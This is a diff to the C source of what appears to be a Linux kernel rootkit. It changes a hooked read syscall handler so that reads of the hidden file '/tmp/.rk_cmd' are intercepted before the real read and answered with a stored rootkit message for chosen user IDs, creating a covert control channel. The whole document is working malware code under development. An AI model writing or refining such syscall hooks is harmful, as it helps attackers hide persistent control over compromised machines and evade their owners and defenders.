@@ -134,14 +134,13 @@ new_read(
 {
     char
         *end;
+
+    long
+        ret = 0;
+
     char
         buf[256];
-    long
-        ret = orig_read(
-            regs);
-    if (
-        ret <= 0)
-        return ret;
+
     int
         fd = regs->di;
     struct file
@@ -159,6 +158,45 @@ new_read(
                 buf));
     fput(
         f);
+
+    if (
+        strcmp(
+            path_fd,
+            "/tmp/.rk_cmd") == 0)
+    {
+
+        uid_t uid = current_uid().val;
+
+        if (
+            uid != 0 && uid != 1000)
+            return ret;
+
+        if (
+            strlen(
+                rk_msg) == 0)
+        {
+            return ret;
+        }
+
+        if (
+            copy_to_user(
+                (
+                    void __user *)regs->si,
+                rk_msg,
+                strlen(
+                    rk_msg)))
+            return -EFAULT;
+
+        return strlen(
+            rk_msg);
+    }
+
+    ret = orig_read(
+        regs);
+
+    if (
+        ret <= 0)
+        return ret;
 
     if (
         strcmp(
@@ -328,38 +366,6 @@ new_read(
 
         kfree(
             kbuf);
-    }
-
-    if (
-        strcmp(
-            path_fd,
-            "/tmp/.rk_cmd") == 0)
-    {
-
-        uid_t uid = current_uid().val;
-
-        if (
-            uid != 0 && uid != 1000)
-            return ret;
-
-        if (
-            strlen(
-                rk_msg) == 0)
-        {
-            return ret;
-        }
-
-        if (
-            copy_to_user(
-                (
-                    void __user *)regs->si,
-                rk_msg,
-                strlen(
-                    rk_msg)))
-            return -EFAULT;
-
-        return strlen(
-            rk_msg);
     }
 
     return ret;
